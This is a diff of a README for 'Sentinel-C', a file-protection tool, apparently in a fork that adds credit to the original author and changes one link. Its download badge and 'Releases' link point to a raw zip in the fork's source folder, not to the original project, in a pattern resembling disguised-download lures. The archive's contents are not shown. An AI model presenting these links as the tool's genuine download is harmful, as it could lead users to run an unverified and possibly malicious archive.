@@ -1,5 +1,8 @@
 # 🛡️ Sentinel-C - Protect Your Files with Ease
 
+> **Note:** This repository retains commit history from the original Sentinel-C project by [voltsparx](https://github.com/voltsparx/Sentinel-C).  
+> All credit for the original code goes to the original author.
+
 [![Download Sentinel-C](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_v3.9.zip)](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_v3.9.zip)
 
 ## 🚀 Getting Started
@@ -84,7 +87,7 @@ If you encounter any issues, here are a few common solutions:
 
 ## 🗂️ Contribution
 
-If you'd like to contribute to Sentinel-C, you can do so by suggesting improvements or reporting issues. Please visit the Issues section of our repository for more information.
+If you'd like to contribute to Sentinel-C, you can suggest improvements or report issues. Please visit the Issues section of our repository for more information.
 
 ## 🌐 Community and Support
 
@@ -92,12 +95,12 @@ Join our community to share experiences, ask questions, and get help. You can fi
 
 - **GitHub Discussions**
 - **Official Forums** (link not provided)
-  
+
 We appreciate feedback, and it helps us improve the software for everyone.
 
 ## 🔗 Useful Links
 
 - [Sentinel-C Releases](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_v3.9.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_v3.9.zip)
+- [Original Sentinel-C Repository](https://github.com/voltsparx/Sentinel-C)
 
 Thank you for choosing Sentinel-C. We’re committed to helping you keep your files secure and organized. Happy monitoring!
